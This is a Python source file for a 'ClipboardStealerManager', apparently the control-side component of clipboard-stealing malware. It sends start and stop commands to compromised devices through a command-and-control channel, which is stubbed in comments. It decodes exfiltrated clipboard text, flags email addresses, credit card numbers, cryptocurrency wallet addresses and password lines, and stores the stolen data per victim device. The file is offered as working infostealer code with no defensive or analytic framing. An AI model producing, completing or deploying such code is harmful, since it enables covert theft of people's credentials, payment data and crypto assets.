import os
import re
import json
import logging
import base64
from datetime import datetime
from typing import Optional, List, Dict

logger = logging.getLogger(__name__)

class ClipboardStealerManager:
    def __init__(self, storage_dir: str = None):
        self.storage_dir = storage_dir or os.environ.get('CLIPBOARD_STORAGE', '/data/clipboard_logs')
        os.makedirs(self.storage_dir, exist_ok=True)
        self.sensitive_patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
            'password_keywords': ['pass', 'password', 'pwd', 'رمز', 'كلمة المرور'],
            'crypto_address': r'\b(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b'
        }

    def start_monitoring(self, device_id: str, c2_endpoint: str = None) -> bool:
        """Send command to start clipboard monitoring on a device."""
        logger.info(f"Sending start clipboard monitoring to {device_id}")
        try:
            # In real implementation, send via C2 channel
            # c2.send_command(device_id, 'START_CLIPBOARD_MONITOR')
            return True
        except Exception as e:
            logger.error(f"Failed to start monitoring on {device_id}: {e}")
            return False

    def stop_monitoring(self, device_id: str) -> bool:
        """Send command to stop clipboard monitoring."""
        logger.info(f"Sending stop clipboard monitoring to {device_id}")
        try:
            # c2.send_command(device_id, 'STOP_CLIPBOARD_MONITOR')
            return True
        except Exception as e:
            logger.error(f"Failed to stop monitoring on {device_id}: {e}")
            return False

    def process_clipboard_data(self, device_id: str, raw_data: bytes) -> Dict:
        """Decode, analyze and store clipboard content."""
        try:
            decoded = base64.b64decode(raw_data).decode('utf-8', errors='ignore')
        except Exception as e:
            logger.error(f"Decoding failed for {device_id}: {e}")
            decoded = raw_data.decode('utf-8', errors='ignore')

        analysis = self._analyze_content(decoded)
        self._store_data(device_id, decoded, analysis)

        if analysis.get('sensitive'):
            logger.info(f"Sensitive clipboard data detected from {device_id}: {analysis['sensitive']}")

        return analysis

    def _analyze_content(self, text: str) -> Dict:
        """Search for sensitive patterns in clipboard text."""
        result = {'sensitive': [], 'raw_length': len(text), 'timestamp': datetime.utcnow().isoformat()}

        emails = re.findall(self.sensitive_patterns['email'], text)
        if emails:
            result['sensitive'].extend(emails)

        cards = re.findall(self.sensitive_patterns['credit_card'], text)
        if cards:
            result['sensitive'].extend(cards)

        addresses = re.findall(self.sensitive_patterns['crypto_address'], text)
        if addresses:
            result['sensitive'].extend(addresses)

        for line in text.splitlines():
            lower = line.lower()
            if any(keyword in lower for keyword in self.sensitive_patterns['password_keywords']):
                result['sensitive'].append(line.strip())
                break

        result['has_sensitive'] = len(result['sensitive']) > 0
        return result

    def _store_data(self, device_id: str, raw_text: str, analysis: Dict):
        """Store clipboard data to disk (encrypted if possible)."""
        device_dir = os.path.join(self.storage_dir, device_id)
        os.makedirs(device_dir, exist_ok=True)

        filename = f"clipboard_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.log"
        filepath = os.path.join(device_dir, filename)

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"TIMESTAMP: {analysis['timestamp']}\n")
                f.write(f"RAW LENGTH: {analysis['raw_length']}\n")
                f.write("CONTENT:\n")
                f.write(raw_text)
                if analysis['has_sensitive']:
                    f.write("\n\nSENSITIVE:\n")
                    for item in analysis['sensitive']:
                        f.write(f"- {item}\n")
            logger.debug(f"Stored clipboard data for {device_id}: {filepath}")
        except Exception as e:
            logger.error(f"Failed to store clipboard data for {device_id}: {e}")

    def get_history(self, device_id: str, limit: int = 10) -> List[str]:
        """Retrieve recent clipboard entries for a device."""
        device_dir = os.path.join(self.storage_dir, device_id)
        if not os.path.exists(device_dir):
            return []

        files = sorted(os.listdir(device_dir), reverse=True)
        result = []
        for fname in files[:limit]:
            full = os.path.join(device_dir, fname)
            try:
                with open(full, 'r', encoding='utf-8') as f:
                    result.append(f.read())
            except Exception as e:
                logger.error(f"Error reading {full}: {e}")
        return result